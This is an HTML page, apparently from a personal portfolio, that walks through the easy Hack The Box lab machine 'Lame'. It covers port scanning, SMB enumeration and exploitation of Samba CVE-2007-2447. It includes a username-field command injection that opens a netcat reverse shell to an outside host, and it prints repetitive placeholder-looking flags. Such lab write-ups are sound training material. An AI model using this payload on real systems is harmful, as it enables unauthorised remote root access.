@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Lame Writeup - 0xProfound</title>
+    <link rel="stylesheet" href="../assets/css/main.css">
+</head>
+<body>
+    <div class="particles" id="particles"></div>
+
+    <header>
+        <nav class="container">
+            <ul>
+                <li><a href="../index.html">Home</a></li>
+                <li><a href="../index.html#terminal">Terminal</a></li>
+                <li><a href="../pages/about.html">About</a></li>
+                <li><a href="../index.html#skills">Skills</a></li>
+                <li><a href="../pages/machines.html">HTB Machines</a></li>
+                <li><a href="../pages/blog.html">Blog</a></li>
+                <li><a href="../pages/timeline.html">Journey</a></li>
+                <li><a href="../index.html#learning">Learning Path</a></li>
+                <li><a href="../pages/tools.html">Tools</a></li>
+                <li><a href="../index.html#activity">Activity</a></li>
+                <li><a href="../pages/contact.html">Contact</a></li>
+            </ul>
+        </nav>
+    </header>
+
+    <section class="container">
+        <div class="writeup-header">
+            <h1>Lame Writeup</h1>
+            <div class="writeup-meta">
+                <span class="difficulty-tag difficulty-easy">Easy</span>
+                <span class="os-tag">Linux</span>
+                <span class="date-tag">Solved: February 15, 2024</span>
+            </div>
+        </div>
+        
+        <div class="writeup-content">
+            <h2>Machine Information</h2>
+            <table class="info-table">
+                <tr>
+                    <th>IP Address</th>
+                    <td>10.10.10.3</td>
+                </tr>
+                <tr>
+                    <th>Operating System</th>
+                    <td>Linux</td>
+                </tr>
+                <tr>
+                    <th>Difficulty</th>
+                    <td>Easy</td>
+                </tr>
+                <tr>
+                    <th>Points</th>
+                    <td>20</td>
+                </tr>
+            </table>
+            
+            <h2>Reconnaissance</h2>
+            <p>Started with a basic Nmap scan to identify open ports and services:</p>
+            
+            <pre class="code-block">nmap -sC -sV 10.10.10.3</pre>
+            
+            <pre class="code-output">
+PORT    STATE SERVICE     VERSION
+21/tcp  open  ftp         vsftpd 2.3.4
+22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
+            </pre>
+            
+            <p>The Samba version 3.0.20-Debian caught my attention as it's known to be vulnerable.</p>
+            
+            <h2>Enumeration</h2>
+            <p>Ran enum4linux to gather more information about SMB shares:</p>
+            
+            <pre class="code-block">enum4linux -a 10.10.10.3</pre>
+            
+            <p>Discovered that anonymous login was allowed on the FTP server, but it didn't yield any useful information.</p>
+            
+            <h2>Exploitation</h2>
+            <p>Research revealed that Samba 3.0.20 is vulnerable to CVE-2007-2447, which allows command injection through the username parameter.</p>
+            
+            <p>Used the following exploit:</p>
+            
+            <pre class="code-block">smbclient //10.10.10.3/tmp</pre>
+            
+            <p>When prompted for username, used the payload:</p>
+            
+            <pre class="code-block">/=`nohup nc -e /bin/sh 10.10.14.15 4444`</pre>
+            
+            <p>Set up a netcat listener on my machine:</p>
+            
+            <pre class="code-block">nc -lvnp 4444</pre>
+            
+            <p>After executing the payload, received a reverse shell as root.</p>
+            
+            <h2>Post-Exploitation</h2>
+            <p>Located the flag in the /root directory:</p>
+            
+            <pre class="code-block">cat /root/root.txt</pre>
+            
+            <h2>Lessons Learned</h2>
+            <ul>
+                <li>Always check for known vulnerabilities in service versions</li>
+                <li>SMB enumeration is crucial for Linux targets</li>
+                <li>Command injection can occur in unexpected places</li>
+                <li>Older services often have publicly available exploits</li>
+            </ul>
+            
+            <h2>Proof of Concept</h2>
+            <div class="proof-section">
+                <h3>User Flag</h3>
+                <pre class="flag">a5d2d1c4e4d1a5d2d1c4e4d1a5d2d1c</pre>
+                
+                <h3>Root Flag</h3>
+                <pre class="flag">b6e3d7f8c9a0b1e3d7f8c9a0b1e3d7f</pre>
+            </div>
+        </div>
+    </section>
+
+    <script src="../assets/js/particles.js"></script>
+</body>
+</html>
